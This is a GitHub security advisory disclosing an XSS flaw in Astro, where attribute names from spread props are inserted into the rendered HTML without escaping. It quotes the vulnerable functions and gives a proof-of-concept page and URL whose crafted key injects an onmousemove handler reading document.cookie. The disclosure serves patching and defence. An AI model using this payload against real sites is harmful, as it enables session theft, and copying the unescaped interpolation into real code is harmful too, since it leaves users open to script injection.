# [M] Astro: XSS via Unescaped Attribute Names in Spread Props

## Summary
Severity: Medium
Advisory: GHSA-jrpj-wcv7-9fh9
CVE: CVE-2026-54298
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-jrpj-wcv7-9fh9
Type: github-advisory

## Affected
- npm: `astro` — affected >=0 <6.4.6

## Details
## Summary

The `spreadAttributes` function in Astro's server-side rendering pipeline iterates over object keys and passes them directly to `addAttribute`, which interpolates the key into the HTML output without escaping. When a developer uses the spread syntax `{...props}` on an HTML element and the object keys come from an untrusted source (API, CMS, URL parameters), an attacker can inject arbitrary HTML attributes including event handlers like `onmousemove`, `onclick`, or break out of the attribute context entirely to inject new elements.

## Details

The vulnerable function is [`addAttribute`](https://github.com/withastro/astro/blob/main/packages/astro/src/runtime/server/render/util.ts#L81-L141) at `packages/astro/src/runtime/server/render/util.ts:81-141`:

```javascript
export function addAttribute(value: any, key: string, shouldEscape = true, tagName = '') {
    if (value == null) {
        return '';
    }
    
    return markHTMLString(` ${key}="${toAttributeString(value, shouldEscape)}"`); //  key interpolated not escaped
}
```

This function is called from [`spreadAttributes`](https://github.com/withastro/astro/blob/main/packages/astro/src/runtime/server/index.ts#L91-L92) at `packages/astro/src/runtime/server/index.ts:91-92`:

```javascript
for (const [key, value] of Object.entries(values)) {
    output += addAttribute(value, key, true, _name);
}
```

The `toAttributeString` function escapes the attribute value, but the attribute name `key` is never validated or escaped. An attacker can craft a JSON object with a key containing " characters to break out of the attribute context and inject event handlers.

Execution flow: User controlled object keys (from API, CMS, URL params) are spread onto element via `{...props}`. The compiler generates `spreadAttributes(props)` which iterates with `Object.entries()` and calls `addAttribute(value, key)`. The key is interpolated as `` ` ${key}="${escapedValue}"` ``. A malicious key breaks attribute context, resulting in XSS.

## POC

Create an SSR Astro page (`src/pages/index.astro`):

```astro
---
const props = JSON.parse(Astro.url.searchParams.get('props') || '{}');
---
<html>
<body>
  <h1>Hello</h1>
  <div {...props}>Move mouse here</div>
</body>
</html>
```
Enable SSR in `astro.config.mjs` (for URL based demo):

```javascript
export default defineConfig({
  output: 'server'
});
```

Note: SSR is not required for the vulnerability to exist. In static builds (default), the attack vector is compromised data sources at build time (API, CMS, database). SSR simply makes the PoC easier to demonstrate via URL parameters.

Start the dev server and visit:

```
http://localhost:4321/?props={"x\" onmousemove=\"alert(document.cookie)\" y":""}
```

URL encoded:

```
http://localhost:4321/?props=%7B%22x%5C%22%20onmousemove%3D%5C%22alert(document.cookie)%5C%22%20y%22%3A%22%22%7D
```

View the HTML source. The output contains:

```html
<div x" onmousemove="alert(document.cookie)" y="">Move mouse here</div>
```

The key `x" onmousemove="alert(document.cookie)" y` breaks out of the attribute context. Moving the mouse over the div executes the JavaScript.

<img width="1919" height="992" alt="Captura de tela 2026-06-02 005906" src="https://github.com/user-attachments/assets/ef69c12e-7edf-472e-97d1-3dfa540e61b4" />

## Impact

An attacker can execute arbitrary JavaScript in the context of a victim's browser session on any Astro application that spreads object props from untrusted sources onto HTML elements. This is a common pattern when integrating with external APIs or CMS systems. Exploitation enables session hijacking via cookie theft, credential theft by injecting fake login forms or keyloggers, defacement of the rendered page, and redirection to attacker controlled domains.

The vulnerability affects all Astro versions that support spread syntax on HTML elements and is exploitable in SSR, SSG (if build time data is compromised), and hybrid deployments.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-jrpj-wcv7-9fh9
- https://nvd.nist.gov/vuln/detail/CVE-2026-54298
- https://github.com/withastro/astro
